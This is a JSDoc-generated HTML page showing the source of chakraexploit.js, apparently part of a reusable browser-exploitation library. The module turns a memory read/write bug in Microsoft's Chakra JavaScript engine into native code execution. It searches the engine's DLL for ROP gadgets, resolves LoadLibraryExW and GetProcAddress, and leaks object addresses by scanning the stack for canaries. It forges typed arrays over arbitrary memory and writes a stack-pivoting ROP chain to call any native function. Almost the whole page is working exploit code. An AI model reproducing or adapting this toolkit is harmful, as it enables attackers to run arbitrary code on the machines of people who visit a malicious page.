<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>chakraexploit.js - Documentation</title>

    <script src="scripts/prettify/prettify.js"></script>
    <script src="scripts/prettify/lang-css.js"></script>
    <!--[if lt IE 9]>
      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <link type="text/css" rel="stylesheet" href="styles/prettify.css">
    <link type="text/css" rel="stylesheet" href="styles/jsdoc.css">
</head>
<body>

<input type="checkbox" id="nav-trigger" class="nav-trigger" />
<label for="nav-trigger" class="navicon-button x">
  <div class="navicon"></div>
</label>

<label for="nav-trigger" class="overlay"></label>

<nav>
    <h2><a href="index.html">Home</a></h2><h3>Classes</h3><ul><li><a href="BaseExploit.html">BaseExploit</a><ul class='methods'><li data-type='method'><a href="BaseExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="BaseExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="BaseExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="BaseExploit.html#importFunction">importFunction</a></li></ul></li><li><a href="BaseExploit_ArrayType.html">BaseExploit#ArrayType</a></li><li><a href="BaseExploit_CString.html">BaseExploit#CString</a></li><li><a href="BaseExploit_FunctionType.html">BaseExploit#FunctionType</a><ul class='methods'><li data-type='method'><a href="BaseExploit_FunctionType.html#cast">cast</a></li></ul></li><li><a href="BaseExploit_IntType.html">BaseExploit#IntType</a></li><li><a href="BaseExploit_Pointer.html">BaseExploit#Pointer</a><ul class='methods'><li data-type='method'><a href="BaseExploit_Pointer.html#add">add</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#isNull">isNull</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#load">load</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#store">store</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#toString">toString</a></li></ul></li><li><a href="BaseExploit_PointerType.html">BaseExploit#PointerType</a><ul class='methods'><li data-type='method'><a href="BaseExploit_PointerType.html#cast">cast</a></li></ul></li><li><a href="BaseExploit_StructPointer.html">BaseExploit#StructPointer</a></li><li><a href="BaseExploit_StructType.html">BaseExploit#StructType</a></li><li><a href="BaseExploit_Type.html">BaseExploit#Type</a></li><li><a href="BaseExploit_WString.html">BaseExploit#WString</a></li><li><a href="ChakraExploit.html">ChakraExploit</a><ul class='methods'><li data-type='method'><a href="ChakraExploit.html#addressOf">addressOf</a></li><li data-type='method'><a href="ChakraExploit.html#addressOfArrayBuffer">addressOfArrayBuffer</a></li><li data-type='method'><a href="ChakraExploit.html#addressOfSlow">addressOfSlow</a></li><li data-type='method'><a href="ChakraExploit.html#call">call</a></li><li data-type='method'><a href="ChakraExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="ChakraExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="ChakraExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="ChakraExploit.html#importFunction">importFunction</a></li><li data-type='method'><a href="ChakraExploit.html#initChakra">initChakra</a></li></ul></li><li><a href="ChakraExploit_ArrayType.html">ChakraExploit#ArrayType</a></li><li><a href="ChakraExploit_CString.html">ChakraExploit#CString</a></li><li><a href="ChakraExploit_FunctionType.html">ChakraExploit#FunctionType</a></li><li><a href="ChakraExploit_IntType.html">ChakraExploit#IntType</a></li><li><a href="ChakraExploit_Pointer.html">ChakraExploit#Pointer</a></li><li><a href="ChakraExploit_PointerType.html">ChakraExploit#PointerType</a></li><li><a href="ChakraExploit_StructPointer.html">ChakraExploit#StructPointer</a></li><li><a href="ChakraExploit_StructType.html">ChakraExploit#StructType</a></li><li><a href="ChakraExploit_Thread.html">ChakraExploit#Thread</a><ul class='methods'><li data-type='method'><a href="ChakraExploit_Thread.html#onmessage">onmessage</a></li><li data-type='method'><a href="ChakraExploit_Thread.html#postMessage">postMessage</a></li></ul></li><li><a href="ChakraExploit_Type.html">ChakraExploit#Type</a></li><li><a href="ChakraExploit_WString.html">ChakraExploit#WString</a></li><li><a href="ChakraThreadExploit.html">ChakraThreadExploit</a><ul class='methods'><li data-type='method'><a href="ChakraThreadExploit.html#addressOf">addressOf</a></li><li data-type='method'><a href="ChakraThreadExploit.html#addressOfArrayBuffer">addressOfArrayBuffer</a></li><li data-type='method'><a href="ChakraThreadExploit.html#addressOfSlow">addressOfSlow</a></li><li data-type='method'><a href="ChakraThreadExploit.html#call">call</a></li><li data-type='method'><a href="ChakraThreadExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="ChakraThreadExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="ChakraThreadExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="ChakraThreadExploit.html#importFunction">importFunction</a></li><li data-type='method'><a href="ChakraThreadExploit.html#initChakra">initChakra</a></li><li data-type='method'><a href="ChakraThreadExploit.html#read">read</a></li><li data-type='method'><a href="ChakraThreadExploit.html#write">write</a></li></ul></li><li><a href="ChakraThreadExploit_ArrayType.html">ChakraThreadExploit#ArrayType</a></li><li><a href="ChakraThreadExploit_CString.html">ChakraThreadExploit#CString</a></li><li><a href="ChakraThreadExploit_FunctionType.html">ChakraThreadExploit#FunctionType</a></li><li><a href="ChakraThreadExploit_IntType.html">ChakraThreadExploit#IntType</a></li><li><a href="ChakraThreadExploit_Pointer.html">ChakraThreadExploit#Pointer</a></li><li><a href="ChakraThreadExploit_PointerType.html">ChakraThreadExploit#PointerType</a></li><li><a href="ChakraThreadExploit_StructPointer.html">ChakraThreadExploit#StructPointer</a></li><li><a href="ChakraThreadExploit_StructType.html">ChakraThreadExploit#StructType</a></li><li><a href="ChakraThreadExploit_Thread.html">ChakraThreadExploit#Thread</a></li><li><a href="ChakraThreadExploit_Type.html">ChakraThreadExploit#Type</a></li><li><a href="ChakraThreadExploit_WString.html">ChakraThreadExploit#WString</a></li><li><a href="ChromeExploit.html">ChromeExploit</a><ul class='methods'><li data-type='method'><a href="ChromeExploit.html#addressOf">addressOf</a></li><li data-type='method'><a href="ChromeExploit.html#addressOfArrayBuffer">addressOfArrayBuffer</a></li><li data-type='method'><a href="ChromeExploit.html#addressOfSlow">addressOfSlow</a></li><li data-type='method'><a href="ChromeExploit.html#call">call</a></li><li data-type='method'><a href="ChromeExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="ChromeExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="ChromeExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="ChromeExploit.html#importFunction">importFunction</a></li><li data-type='method'><a href="ChromeExploit.html#initChrome">initChrome</a></li></ul></li><li><a href="ChromeExploit_ArrayType.html">ChromeExploit#ArrayType</a></li><li><a href="ChromeExploit_CString.html">ChromeExploit#CString</a></li><li><a href="ChromeExploit_FunctionType.html">ChromeExploit#FunctionType</a></li><li><a href="ChromeExploit_IntType.html">ChromeExploit#IntType</a></li><li><a href="ChromeExploit_Pointer.html">ChromeExploit#Pointer</a></li><li><a href="ChromeExploit_PointerType.html">ChromeExploit#PointerType</a></li><li><a href="ChromeExploit_StructPointer.html">ChromeExploit#StructPointer</a></li><li><a href="ChromeExploit_StructType.html">ChromeExploit#StructType</a></li><li><a href="ChromeExploit_Type.html">ChromeExploit#Type</a></li><li><a href="ChromeExploit_WString.html">ChromeExploit#WString</a></li><li><a href="global.html#Integer">Integer</a><ul class='methods'><li data-type='method'><a href="global.html#Integer#add">add</a></li><li data-type='method'><a href="global.html#Integer#and">and</a></li><li data-type='method'><a href="global.html#Integer#comp">comp</a></li><li data-type='method'><a href="global.html#Integer#compare">compare</a></li><li data-type='method'><a href="global.html#Integer#div">div</a></li><li data-type='method'><a href="global.html#Integer#divide">divide</a></li><li data-type='method'><a href="global.html#Integer#eq">eq</a></li><li data-type='method'><a href="global.html#Integer#equals">equals</a></li><li data-type='method'><a href="global.html#Integer#getHighBits">getHighBits</a></li><li data-type='method'><a href="global.html#Integer#getHighBitsUnsigned">getHighBitsUnsigned</a></li><li data-type='method'><a href="global.html#Integer#getLowBits">getLowBits</a></li><li data-type='method'><a href="global.html#Integer#getLowBitsUnsigned">getLowBitsUnsigned</a></li><li data-type='method'><a href="global.html#Integer#getNumBitsAbs">getNumBitsAbs</a></li><li data-type='method'><a href="global.html#Integer#greaterThan">greaterThan</a></li><li data-type='method'><a href="global.html#Integer#greaterThanOrEqual">greaterThanOrEqual</a></li><li data-type='method'><a href="global.html#Integer#gt">gt</a></li><li data-type='method'><a href="global.html#Integer#gte">gte</a></li><li data-type='method'><a href="global.html#Integer#isEven">isEven</a></li><li data-type='method'><a href="global.html#Integer#isNegative">isNegative</a></li><li data-type='method'><a href="global.html#Integer#isOdd">isOdd</a></li><li data-type='method'><a href="global.html#Integer#isPositive">isPositive</a></li><li data-type='method'><a href="global.html#Integer#isZero">isZero</a></li><li data-type='method'><a href="global.html#Integer#lessThan">lessThan</a></li><li data-type='method'><a href="global.html#Integer#lessThanOrEqual">lessThanOrEqual</a></li><li data-type='method'><a href="global.html#Integer#lt">lt</a></li><li data-type='method'><a href="global.html#Integer#lte">lte</a></li><li data-type='method'><a href="global.html#Integer#mod">mod</a></li><li data-type='method'><a href="global.html#Integer#modulo">modulo</a></li><li data-type='method'><a href="global.html#Integer#mul">mul</a></li><li data-type='method'><a href="global.html#Integer#multiply">multiply</a></li><li data-type='method'><a href="global.html#Integer#neg">neg</a></li><li data-type='method'><a href="global.html#Integer#negate">negate</a></li><li data-type='method'><a href="global.html#Integer#neq">neq</a></li><li data-type='method'><a href="global.html#Integer#not">not</a></li><li data-type='method'><a href="global.html#Integer#notEquals">notEquals</a></li><li data-type='method'><a href="global.html#Integer#or">or</a></li><li data-type='method'><a href="global.html#Integer#shiftLeft">shiftLeft</a></li><li data-type='method'><a href="global.html#Integer#shiftRight">shiftRight</a></li><li data-type='method'><a href="global.html#Integer#shiftRightUnsigned">shiftRightUnsigned</a></li><li data-type='method'><a href="global.html#Integer#shl">shl</a></li><li data-type='method'><a href="global.html#Integer#shr">shr</a></li><li data-type='method'><a href="global.html#Integer#shru">shru</a></li><li data-type='method'><a href="global.html#Integer#sub">sub</a></li><li data-type='method'><a href="global.html#Integer#subtract">subtract</a></li><li data-type='method'><a href="global.html#Integer#toBytes">toBytes</a></li><li data-type='method'><a href="global.html#Integer#toBytesBE">toBytesBE</a></li><li data-type='method'><a href="global.html#Integer#toBytesLE">toBytesLE</a></li><li data-type='method'><a href="global.html#Integer#toInt">toInt</a></li><li data-type='method'><a href="global.html#Integer#toNumber">toNumber</a></li><li data-type='method'><a href="global.html#Integer#toSigned">toSigned</a></li><li data-type='method'><a href="global.html#Integer#toString">toString</a></li><li data-type='method'><a href="global.html#Integer#toUnsigned">toUnsigned</a></li><li data-type='method'><a href="global.html#Integer#xor">xor</a></li></ul></li></ul><h3><a href="global.html">Global</a></h3>
</nav>

<div id="main">
    
    <h1 class="page-title">chakraexploit.js</h1>
    

    



    
    <section>
        <article>
            <pre class="prettyprint source linenums"><code>import BaseExploit from "baseexploit";
import Integer from "integer";

/**
 * Constructs an exploit with sensible defaults for Chakra. Child must call initChakra method once read and write methods are available.
 *
 * @augments BaseExploit
 * @class
 * @constructor
 */
function ChakraExploit() {
    var exploit = this;
    BaseExploit.call(this, 64);

    /**
     * Constructs a thread using a Web Worker. The worker script must create a {@link ChakraThreadExploit} object.
     *
     * @memberof ChakraExploit
     * @instance
     * @class
     * @constructor
     */
    function Thread(url) {
        var worker = new Worker(url);
        worker.onmessage = (e) => {
            if (e.data == 'CHAKRA_EXPLOIT') {
                var stackLimit = exploit.globalListFirst.load()[exploit.threadContextStackLimit];
                // Default stack size of web worker
                //   1 MB
                var stackSize = 1 * 1024 * 1024;
                var stackTop = stackLimit.sub(0xc000).add(stackSize);
                var stk = exploit.Uint64Ptr.cast(stackTop).add(-1);
                while (!new Integer(0x41424344, 0x10000).eq(stk.load())) {
                    stk = stk.add(-1);
                    if (stk.address &lt;= stackTop.sub(0x10000)) {
                        throw 'unable to find canary';
                    }
                }
                var worker = exploit.Uint64Ptr.cast(stk[1]);
                var manager = exploit.Uint64Ptr.cast(stk[2]);
                manager[7] = worker;
            } else if (this.onmessage) {
                return this.onmessage(e);
            }
        }
        /**
         * @memberof ChakraExploit#Thread
         * @instance
         * @function onmessage
         */
        this.onmessage = null;
        /**
         * postMessage to web worker
         * @function
         */
        this.postMessage = worker.postMessage.bind(worker);
    }
    this.Thread = Thread;
}
ChakraExploit.prototype = Object.create(BaseExploit.prototype);
ChakraExploit.prototype.constructor = ChakraExploit;
/**
 * Initializes Chakra helpers using memory read and write.
 *
 * @param {Integer|Pointer} vtable Any address in the chakra DLL
 */
ChakraExploit.prototype.initChakra = function (vtable) {
    this.chakraBase = this.findModuleBase(vtable);

    var gadgets = [
        ['callLoadLibraryExW', [0x48, 0x8B, 0xC8, 0x33, 0xD2, 0x41, 0xB8, 0x00, 0x08, 0x00, 0x00, 0xFF, 0x15]],
        ['jmpGetProcAddress', [0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x49, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x0B, 0x48, 0x83, 0xC4, 0x28, 0x48, 0xFF, 0x25]],
        ['nopReturn', [0xC3]],
        ['popRaxReturn', [0x58, 0xC3]],
        ['popRdxReturn', [0x5A, 0xC3]],
        ['popRspReturn', [0x5C, 0xC3]],
        ['popRbpReturn', [0x5D, 0xC3]],
        ['addRsp58Return', [0x48, 0x83, 0xC4, 0x58, 0xC3]],
        ['storeRaxAtRdxReturn', [0x48, 0x89, 0x02, 0xC3]],
        ['entrySlice', [0x8B, 0xF8, 0x41, 0x83, -1, 0x02]],
        ['amd64CallFunction', [0x4C, 0x8B, 0x4E, 0x08, 0x4C, 0x8B, 0x06, 0x48, 0x83, 0xEC, 0x20, 0xFF]],
        ['linkToBeginningThreadContext', [0x48, 0x8B, 0xC4, 0x4C, 0x89, 0x40, 0x18, 0x48, 0x89, 0x50, 0x10, 0x48, 0x89, 0x48, 0x08, 0x48, 0x83, -1, -1, 0x00]],
        ['popRcxRdxR8R9Return', [0x48, 0x8B, 0x4C, 0x24, 0x08, 0x48, 0x8B, 0x54, 0x24, 0x10, 0x4C, 0x8B, 0x44, 0x24, 0x18, 0x4C, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0xFF, 0xE0]],
        ['addRsp28Return', [0x48, 0x83, 0xC4, 0x28, 0xC3]],
    ];
    this.gadgets = this.findGadgets(this.chakraBase, gadgets);
    // amd64CallFunction was changed in 1709, so the offset to after the call is different
    //      call rax (FF D0)
    //      call __guard_dispatch_icall_fptr (FF 15 ...)
    this.amd64CallFunctionReturnOffset = this.gadgets.amd64CallFunction[12] == 0xD0 ? 13 : 17;
    // initialize ThreadContext information
    if (this.gadgets.linkToBeginningThreadContext[17] == 0x61) {
        this.threadContextPrev = this.gadgets.linkToBeginningThreadContext[18] / 8;
        this.threadContextNext = this.gadgets.linkToBeginningThreadContext[30] / 8;
        this.globalListFirst = new this.PointerType(this.Uint64Ptr).cast(this.Uint64.cast(this.gadgets.linkToBeginningThreadContext).add(27).add(this.Int32Ptr.cast(this.gadgets.linkToBeginningThreadContext.add(23))[0]));
    } else if (this.gadgets.linkToBeginningThreadContext[17] == 0xA1) {
        this.threadContextPrev = this.gadgets.linkToBeginningThreadContext[18] / 8;
        this.threadContextNext = this.gadgets.linkToBeginningThreadContext[33] / 8;
        this.globalListFirst = new this.PointerType(this.Uint64Ptr).cast(this.Uint64.cast(this.gadgets.linkToBeginningThreadContext).add(30).add(this.Int32Ptr.cast(this.gadgets.linkToBeginningThreadContext.add(26))[0]));
    } else {
        throw 'unsupported version';
    }
    var p = this.globalListFirst[0];
    for (var i = 0;; i++) {
        if ((p[i] &amp; 0xffff) == 0xc000) {
            break;
        }
    }
    this.threadContextStackLimit = i;
    // initialize LoadLibraryExW and GetProcAddress
    var p = this.gadgets.callLoadLibraryExW.add(17).add(this.Int32Ptr.cast(this.gadgets.callLoadLibraryExW.add(13)).load());
    this.LoadLibraryExW = new this.PointerType(this.Uint8Ptr).cast(p).load();
    var p = this.gadgets.jmpGetProcAddress.add(23).add(this.Int32Ptr.cast(this.gadgets.jmpGetProcAddress.add(19)).load());
    this.GetProcAddress = new this.PointerType(this.Uint8Ptr).cast(p).load();
    // initialize stackTop
    this.findStackTop();
    // initialize support for fast addressOf
    this.locateArray = [{}];
    this.locateArrayPtr = new this.PointerType(this.Uint64Ptr).cast(this.addressOfSlow(this.locateArray))[5].add(3);
    if (!this.addressOfSlow(this.locateArray[0]).address.eq(this.locateArrayPtr[0])) {
        throw 'init of addressOf failed!'
    }
}
/**
 * Returns the address of a Javascript object.
 *
 * @param {*} obj Any Javascript object
 * @returns {Pointer}
 */
ChakraExploit.prototype.addressOf = function (obj) {
    this.locateArray[0] = obj;
    return this.locateArrayPtr[0];
}
/**
 * Returns the address of ArrayBuffer contents.
 *
 * @param {ArrayBuffer} ab ArrayBuffer
 * @returns {Pointer}
 */
ChakraExploit.prototype.addressOfArrayBuffer = function (ab) {
    var dv = new DataView(ab);
    var p = this.Uint64Ptr.cast(this.addressOf(dv));
    return p[7];
}
ChakraExploit.prototype.findStackTop = function () {
    if (this.stackTop === undefined) {
        // Default stack size of browser tab
        //  10 MB
        // Default stack size of web worker
        //   1 MB
        if ('undefined' !== typeof WorkerGlobalScope) {
            var stackLimit = this.globalListFirst.load()[this.threadContextStackLimit];
            var stackSize = 1 * 1024 * 1024;
        } else {
            var stackLimit = this.globalListFirst.load()[this.threadContextStackLimit];
            var stackSize = 10 * 1024 * 1024;
        }
        var stackTop = stackLimit.sub(0xc000).add(stackSize);
        this.stackTop = stackTop;
    }
}
/**
 * Returns the address of a Javascript object. Internal.
 *
 * @param {*} obj Any Javascript object
 * @returns {Pointer}
 */
ChakraExploit.prototype.addressOfSlow = function (obj) {
    var address;
    eval('String.prototype.slice').call('', {
        valueOf: () => {
            var gadgets = this.gadgets;
            var stk = this.Uint64Ptr.cast(this.stackTop).add(-1);
            while (!this.Uint64.cast(gadgets.entrySlice).eq(stk.load())) {
                stk = stk.add(-1);
                if (stk.address &lt;= this.stackTop.sub(0x10000)) {
                    throw 'unable to find entrySlice';
                }
            }
            while (!this.Uint64.cast(gadgets.amd64CallFunction).add(this.amd64CallFunctionReturnOffset).eq(stk.load())) {
                stk = stk.add(1);
                if (stk.address >= this.stackTop) {
                    throw 'unable to find amd64CallFunction';
                }
            }
            while (!stk[0].eq(new Integer(0x42424242, 0x10000)) || !stk[2].eq(new Integer(0x41414141, 0x10000))) {
                stk = stk.add(1);
                if (stk.address >= this.stackTop) {
                    throw 'unable to find canaries';
                }
            }
            address = this.Uint8Ptr.cast(stk[1]);
        }
    }, 0, 0, 0, obj, 0x42424242, obj, 0x41414141);
    return address;
}
ChakraExploit.prototype.customInt32Array = function (address) {
    var i32 = new Int32Array(1);
    var p = this.Uint64Ptr.cast(this.addressOf(i32));
    p[4] = 0x7FFFFFFF;
    p[7] = address;
    return i32;
}
/**
 * Call a function pointer with the given arguments. Used internally by FunctionPointer.
 *
 * @param {Integer} address
 * @param {...Integer} args
 * @returns {Integer}
 */
ChakraExploit.prototype.call = function (address, ...args) {
    if (args.length > 10) {
        throw 'too many arguments';
    }
    var returnValAddr;
    eval('String.prototype.slice').call('', {
        valueOf: () => {
            var gadgets = this.gadgets;
            var amd64CallFunction = this.Uint64.cast(gadgets.amd64CallFunction).add(this.amd64CallFunctionReturnOffset);
            var entrySlice = this.Uint64.cast(gadgets.entrySlice);
            var stackBottom = this.stackTop.sub(0x10000);
            var stk = this.customInt32Array(stackBottom);
            for (var i = 0x10000 / 8 - 8; i >= 0; i -= 1) {
                if (entrySlice.low == stk[i*2] &amp;&amp; entrySlice.high == stk[i*2+1]) {
                    break;
                }
            }
            if (i == 0) {
                throw 'unable to find entrySlice';
            }
            while (amd64CallFunction.low != stk[i*2] || amd64CallFunction.high != stk[i*2+1]) {
                i++;
                if (i == 0x10000 / 8) {
                    throw 'unable to find amd64CallFunction';
                }
            }
            var stk = this.Uint64Ptr.cast(stackBottom.add(i * 8));
            var savedRbpAddr = stk.add(-2);
            stk = stk.add(-0x20000 / 8);
            var i32 = this.customInt32Array(stk);
            // probe stack
            for (var i = 0x20; i >= 0; i--) {
                let x = i32[i * 0x1000 / 4];
            }
            // helper for writing Uint64 to Int32Array
            function write64(i32, i, val) {
                if (val.address) {
                    val = val.address;
                } else {
                    val = Integer.fromValue(val);
                }
                i32[i * 2 + 0] = val.low;
                i32[i * 2 + 1] = val.high;
            }
            // ROP chain
            // skip saved rbp, rdi, rsi, rbx
            i = 4;
            write64(i32, i, gadgets.popRaxReturn);
            i++;
            write64(i32, i, gadgets.addRsp28Return);
            i++;
            write64(i32, i, gadgets.popRcxRdxR8R9Return);
            i++;
            // unused
            i++;
            if (args[0] !== undefined)
                write64(i32, i, args[0]); // rcx
            i++;
            if (args[1] !== undefined)
                write64(i32, i, args[1]); // rdx
            i++;
            if (args[2] !== undefined)
                write64(i32, i, args[2]); // r8
            i++;
            if (args[3] !== undefined)
                write64(i32, i, args[3]); // r9
            i++;
            write64(i32, i, gadgets.nopReturn); // fix stack alignment
            i++;
            write64(i32, i, address);
            i++;
            write64(i32, i, gadgets.addRsp58Return);
            i++;
            i += 4; // skip 0x20 shadow space
            if (args[4] !== undefined)
                write64(i32, i, args[4]);
            i++;
            if (args[5] !== undefined)
                write64(i32, i, args[5]);
            i++;
            if (args[6] !== undefined)
                write64(i32, i, args[6]);
            i++;
            if (args[7] !== undefined)
                write64(i32, i, args[7]);
            i++;
            if (args[8] !== undefined)
                write64(i32, i, args[8]);
            i++;
            if (args[9] !== undefined)
                write64(i32, i, args[9]);
            i++;
            if (args[10] !== undefined)
                write64(i32, i, args[10]);
            i++;
            write64(i32, i, gadgets.popRdxReturn);
            i++;
            write64(i32, i, stk);
            i++;
            write64(i32, i, gadgets.storeRaxAtRdxReturn);
            i++;
            write64(i32, i, gadgets.popRaxReturn);
            i++;
            write64(i32, i, new Integer(0, 0x40000));
            i++;
            write64(i32, i, gadgets.popRbpReturn);
            i++;
            write64(i32, i, savedRbpAddr.load());
            i++;
            write64(i32, i, gadgets.popRspReturn);
            i++;
            write64(i32, i, savedRbpAddr.add(2));
            i++;
            savedRbpAddr[0] = stk;
            returnValAddr = stk;
        }
    });
    return returnValAddr[0];
}

export default ChakraExploit;
</code></pre>
        </article>
    </section>




</div>

<br class="clear">

<footer>
    Documentation generated by <a href="https://github.com/jsdoc3/jsdoc">JSDoc 3.5.5</a> on Sat Mar 31 2018 18:23:08 GMT-0700 (PDT) using the <a href="https://github.com/clenemt/docdash">docdash</a> theme.
</footer>

<script>prettyPrint();</script>
<script src="scripts/linenumber.js"></script>
</body>
</html>
